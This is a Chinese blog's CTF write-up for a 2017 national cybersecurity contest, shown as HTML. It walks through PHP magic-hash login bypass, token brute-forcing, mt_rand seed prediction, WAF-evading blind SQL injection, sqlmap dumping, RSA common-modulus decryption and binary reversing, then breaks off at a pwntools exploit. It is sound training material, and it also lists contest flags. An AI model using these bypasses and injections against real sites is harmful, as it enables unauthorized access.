@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="部分Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第三届全国网络空间安全技术大赛(线上初赛)">
+<meta property="og:url" content="https://bestwing.me/cstc-xatu-writeup.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="部分Writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://i.imgur.com/uzIyIK5.png">
+<meta property="og:image" content="http://i.imgur.com/2MLmzn8.png">
+<meta property="og:image" content="http://i.imgur.com/CWEovXF.png">
+<meta property="og:image" content="http://i.imgur.com/g6oxtms.png">
+<meta property="og:image" content="http://i.imgur.com/5R2rXH0.png">
+<meta property="og:image" content="http://i.imgur.com/ClmCCbs.png">
+<meta property="og:image" content="http://i.imgur.com/Xkcyt7V.png">
+<meta property="og:image" content="http://i.imgur.com/pkyjJZN.png">
+<meta property="og:image" content="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png">
+<meta property="og:image" content="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png">
+<meta property="og:image" content="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png">
+<meta property="article:published_time" content="2017-04-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:31:23.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="陕西省赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://i.imgur.com/uzIyIK5.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>第三届全国网络空间安全技术大赛(线上初赛)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/after-upgrade-gdb-wont-attach-to-process.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/write-kernel-exploits-2.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/cstc-xatu-writeup.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/cstc-xatu-writeup.html&text=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/cstc-xatu-writeup.html&is_video=false&description=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第三届全国网络空间安全技术大赛(线上初赛)&body=Check out this article: https://bestwing.me/cstc-xatu-writeup.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/cstc-xatu-writeup.html&title=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/cstc-xatu-writeup.html&name=第三届全国网络空间安全技术大赛(线上初赛)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/cstc-xatu-writeup.html&t=第三届全国网络空间安全技术大赛(线上初赛)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第三届全国网络空间安全技术大赛(线上初赛)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web2-%E6%8A%BD%E6%8A%BD%E5%A5%96"><span class="toc-number">2.</span> <span class="toc-text">Web2 抽抽奖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web3-%E7%BB%A7%E7%BB%AD%E6%8A%BD"><span class="toc-number">3.</span> <span class="toc-text">Web3 继续抽</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web4-Wrong"><span class="toc-number">4.</span> <span class="toc-text">Web4  Wrong</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto1-%E7%AD%BE%E5%88%B0"><span class="toc-number">5.</span> <span class="toc-text">Crypto1 签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypt2-200"><span class="toc-number">6.</span> <span class="toc-text">Crypt2 200</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bin1-Now"><span class="toc-number">7.</span> <span class="toc-text">Bin1 Now</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bin2-Magical-Box"><span class="toc-number">8.</span> <span class="toc-text">Bin2 Magical Box</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc1-%E4%B8%80%E7%BB%B4%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text">Misc1 一维码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc3%E4%B9%BE%E5%9D%A4"><span class="toc-number">10.</span> <span class="toc-text">Misc3乾坤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc4-%E8%BD%A8%E8%BF%B9"><span class="toc-number">11.</span> <span class="toc-text">Misc4 轨迹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc5-%E7%A7%8D%E6%A3%B5%E6%A0%91%E5%90%A7"><span class="toc-number">12.</span> <span class="toc-text">Misc5 种棵树吧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc6-%E6%88%91%E4%BB%AC%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">13.</span> <span class="toc-text">Misc6 我们的秘密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE1-%E6%8B%AF%E6%95%91%E9%B2%81%E7%8F%AD%E4%B8%83%E5%8F%B7"><span class="toc-number">14.</span> <span class="toc-text">MOBILE1 拯救鲁班七号</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-2-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%891"><span class="toc-number">15.</span> <span class="toc-text">MOBILE 2 人民的名义-抓捕赵德汉1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-3-%E4%BA%BA%E6%B0%91%E7%9A%84%E5%90%8D%E4%B9%89-%E6%8A%93%E6%8D%95%E8%B5%B5%E5%BE%B7%E6%B1%892"><span class="toc-number">16.</span> <span class="toc-text">MOBILE 3 人民的名义-抓捕赵德汉2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-4-The-Marauder%E2%80%99s-Map"><span class="toc-number">17.</span> <span class="toc-text">MOBILE 4 The Marauder’s Map</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE-5-%E5%8F%96%E8%AF%81%E5%AF%86%E7%A0%81"><span class="toc-number">18.</span> <span class="toc-text">MOBILE 5 取证密码</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        第三届全国网络空间安全技术大赛(线上初赛)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-04-16T16:00:00.000Z" itemprop="datePublished">2017-04-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/" rel="tag">陕西省赛</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="第三届全国网络空间安全技术大赛-线上初赛"><a href="#第三届全国网络空间安全技术大赛-线上初赛" class="headerlink" title="第三届全国网络空间安全技术大赛(线上初赛)"></a>第三届全国网络空间安全技术大赛(线上初赛)</h1><p>##web 1 签到题<br>1.老套路看源码发现是php隐士转换直接 <code>Username=QNKCDZO，password=240610708</code> ，得到下一个地址<a href="http://117.34.111.15:84/json.php">http://117.34.111.15:84/json.php</a><br>2.继续右键看源码<br><img src="http://i.imgur.com/uzIyIK5.png"></p>
+<p>3.又是弱类型</p>
+<h1 id="Web2-抽抽奖"><a href="#Web2-抽抽奖" class="headerlink" title="Web2 抽抽奖"></a>Web2 抽抽奖</h1><blockquote>
+<p>抽奖呗 <a href="http://117.34.111.15/">http://117.34.111.15/</a></p>
+</blockquote>
+<p>看到 <code>jQuery.js</code> 有点异常，打开源码，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">解码</a>得到以下代码：</p>
+<p>然后直接在控制台输入 <code>getFlag</code>，得到 <code>flag</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.getFlag=<span class="function"><span class="keyword">function</span>(<span class="params">text</span>)</span>&#123;  <span class="keyword">if</span>(text==<span class="string">&#x27;1&#x27;</span>)&#123;      alert(<span class="string">&quot;你最厉害啦!可惜没flag&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;2&#x27;</span>)&#123;      alert(<span class="string">&quot;你太厉害了,竟然是二等奖&quot;</span>)   &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;3&#x27;</span>)&#123;      alert(<span class="string">&quot;你好厉害,三等奖啊&quot;</span>)  &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;flag&#x27;</span>)&#123;       alert(<span class="string">&quot;flag&#123;951c712ac2c3e57053c43d80c0a9e543&#125;&quot;</span>)     &#125;   <span class="keyword">if</span>(text==<span class="string">&#x27;0&#x27;</span>)&#123;      alert(<span class="string">&quot;再来一次吧&quot;</span>)  &#125; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<h1 id="Web3-继续抽"><a href="#Web3-继续抽" class="headerlink" title="Web3 继续抽"></a>Web3 继续抽</h1><p>查看源代码，看代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&#x27;get.php?token=&#x27;</span> + $(<span class="string">&quot;#token&quot;</span>).val() + <span class="string">&quot;&amp;id=&quot;</span> + encode(md5(jsctf2)), <span class="function"><span class="keyword">function</span>(<span class="params">jsctf3</span>) </span>&#123;</span><br><span class="line">    alert(jsctf3[<span class="string">&#x27;text&#x27;</span>])</span><br><span class="line">&#125;, <span class="string">&#x27;json&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>于是构造请求 <code>&#39;http://117.34.111.15:81/get.php?token=&#39;+token+&#39;&amp;id=&#39;+id</code> ，试了下 <code>encode(md5(&#39;1&#39;))、encode(md5(&#39;2&#39;))、encode(md5(&#39;3&#39;))</code>，均没出来 <code>flag</code> ，于是写了 <code>python</code> 脚本，跑构造好的字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyquery</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;zd.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file.readlines():</span><br><span class="line">    id = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    url = <span class="string">&#x27;http://117.34.111.15:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B150 MicroMessenger/6.5.1 NetType/WIFI Language/zh_CN&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>:<span class="string">&#x27;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.get(url=url,headers=headers).text</span><br><span class="line"></span><br><span class="line">    c = pyquery.PyQuery(r)</span><br><span class="line"></span><br><span class="line">    token = c(<span class="string">&#x27;#token&#x27;</span>).val()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    url2 = <span class="string">&#x27;http://117.34.111.15:81/get.php?token=&#x27;</span>+token+<span class="string">&#x27;&amp;id=&#x27;</span>+id</span><br><span class="line"></span><br><span class="line">    r2 = s.get(url=url2,headers=headers)</span><br><span class="line">    str = r2.text</span><br><span class="line">    <span class="keyword">print</span> str.decode(<span class="string">&#x27;unicode_escape&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>), id</span><br></pre></td></tr></table></figure>
+
+<p>于是跑出 <code>flag</code>，也就是当 <code>encode(md5(&#39;147&#39;))</code> 时，</p>
+<h1 id="Web4-Wrong"><a href="#Web4-Wrong" class="headerlink" title="Web4  Wrong"></a>Web4  Wrong</h1><p>找到这个 <code>.index.php.swp</code> 通过恢复文件 <code>vim -r index.php</code> 得到下面源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span>(<span class="params">$pw_length =  <span class="number">10</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">$randpwd = <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)  </span><br><span class="line">&#123;  </span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">return</span> $randpwd;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">mt_srand(time());</span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd==$_GET[<span class="string">&#x27;pwd&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]==$_GET[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good job, you get the key&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="string">&quot;Wrong!&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;userLogin&#x27;</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过小小的审计得到思路 把cookie删掉<br>就可以过第二个if($_SESSION[‘userLogin’]==$_GET[‘login’])</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function create_password($pw_length &#x3D;  10) </span><br><span class="line">&#123;  </span><br><span class="line">    $randpwd &#x3D; &quot;&quot;; </span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $pw_length; $i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        $randpwd .&#x3D; chr(mt_rand(33, 126));  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $randpwd;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(1492307701);</span><br><span class="line">$pwd&#x3D;create_password();</span><br><span class="line">var_dump($pwd);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过下面脚本得到一个随后的时间戳，用 <code>burp</code> 不断发包，等到时间到了设置的时间戳就会得到 <code>flag</code></p>
+<p>##web4 so easy:<br>访问:<code>http://117.34.111.15:89/</code> 得到部分源码</p>
+<p><img src="http://i.imgur.com/2MLmzn8.png"></p>
+<ol>
+<li><p>waf拦截了<code>逗号、空格、and、union</code>等关键字，但是没有过滤<code>mid、ascii、from等关键字</code>，因为过滤了and，那就利用Mysql的位运算<code>0&#39;^1^&#39;1</code>结果为0，拼接sql语句为<code>select role from  user where username =&#39;0&#39;^1^0</code>成功得到查询到admin的role</p>
+</li>
+<li><p>利用bool型盲注进行注入，用()代替空格，用from 1 代替,写一个脚本跑一下，得到密码: <code>37b1d2f04f594bfffc826fd69e389688</code></p>
+<p> <img src="http://i.imgur.com/CWEovXF.png"></p>
+</li>
+<li><p>利用注入的密码去登录</p>
+<p> <img src="http://i.imgur.com/g6oxtms.png"></p>
+</li>
+<li><p>这里直接用mysql字符问题解决，成功获取flag</p>
+<p> <img src="http://i.imgur.com/5R2rXH0.png"></p>
+</li>
+</ol>
+<p>##web5 just a test：<br>1.随手发现注入<br>直接sqlmap跑，开始一直在跑test1库，跑到后台管理账号密码，后台没有</p>
+<p>2.列了一下数据库，看到了test库，想到题目才知道入坑了，但是跑不出来列得到列名为fl@g，尝试去跑内容，但是段都列不了，用尝试手工，成功获取到fl@g的列为f1ag(ps:坑就在@，mysql会把g当做变量，没办法查询，用反引号扩起来就好了)</p>
+<p><img src="http://i.imgur.com/ClmCCbs.png"></p>
+<p><img src="http://i.imgur.com/Xkcyt7V.png"></p>
+<p>因为extractvalue有32位的限制，直接把f1ag加在sqlmap的列的目录里面，直接dump吧</p>
+<p><img src="http://i.imgur.com/pkyjJZN.png"></p>
+<h1 id="Crypto1-签到"><a href="#Crypto1-签到" class="headerlink" title="Crypto1 签到"></a>Crypto1 签到</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ~ <span class="built_in">echo</span> <span class="string">&quot;ZmxhZ3tXZWlTdW9GeXVfQmllTGFuZ30=&quot;</span> | base64 -D</span><br><span class="line">flag&#123;WeiSuoFyu_BieLang&#125;                                 </span><br></pre></td></tr></table></figure>
+
+<h1 id="Crypt2-200"><a href="#Crypt2-200" class="headerlink" title="Crypt2 200"></a>Crypt2 200</h1><p>小强不小心截获了两个老外同服务器的加密通信数据，看看他们在说些什么。。。</p>
+<p>在通信流量中能找到 N 和E，猜测密文都是一样的，用共模攻击<br>得到 <code>flag&#123;flag&#123;Hc0mm0nModulusR$AH&#125;&#125;</code></p>
+<h1 id="Bin1-Now"><a href="#Bin1-Now" class="headerlink" title="Bin1 Now"></a>Bin1 Now</h1><p>程序使用自修改代码、第三方标准库等手段，影响静态分析。程序输入在<code>00402047</code>处，接着在<code>004020E9</code>检查长度是否为9。通过<code>004038F0</code>输出调用定位到关键输出在<code>00402490</code>函数中，此控制此函数关键之跳的<code>dword_446184</code>是在<code>402640</code>函数中确定的。细看下此函数，发现关键算法也在此处，将输入和<code>xmmword_43AC00</code>分别运算后进行比较，因为<code>xmmword_43AC00</code>的计算结果为定值，整理下即可反算出输入<code>536724689</code>，代码如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x04</span>,<span class="number">0x0e</span>,<span class="number">0x16</span>,<span class="number">0x10</span>,<span class="number">0x31</span>]</span><br><span class="line">input = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">	s2 = check[<span class="number">3</span>*i+<span class="number">1</span>]/<span class="number">2</span></span><br><span class="line">	s1 = check[<span class="number">3</span>*i]<span class="number">-2</span>*s2</span><br><span class="line">	s3 = check[<span class="number">3</span>*i+<span class="number">2</span>]<span class="number">-5</span>*s2</span><br><span class="line">	input += chr(s1+<span class="number">0x30</span>)+chr(s2+<span class="number">0x30</span>)+chr(s3+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> input</span><br></pre></td></tr></table></figure>
+
+<p>将输入代入程序即可得到后面一部分的flag：<code>0IdWan9&#125;</code><br>根据题目提示，终于在文件的详细资料里找到一串base64串，解之得到<code>flag&#123;aoot@mail:</code>。<br>所以最终flag:<code>flag&#123;aoot@mail:0IdWan9&#125;</code>。</p>
+<h1 id="Bin2-Magical-Box"><a href="#Bin2-Magical-Box" class="headerlink" title="Bin2 Magical Box"></a>Bin2 Magical Box</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;117.34.80.134&quot;</span>, <span class="number">7777</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span 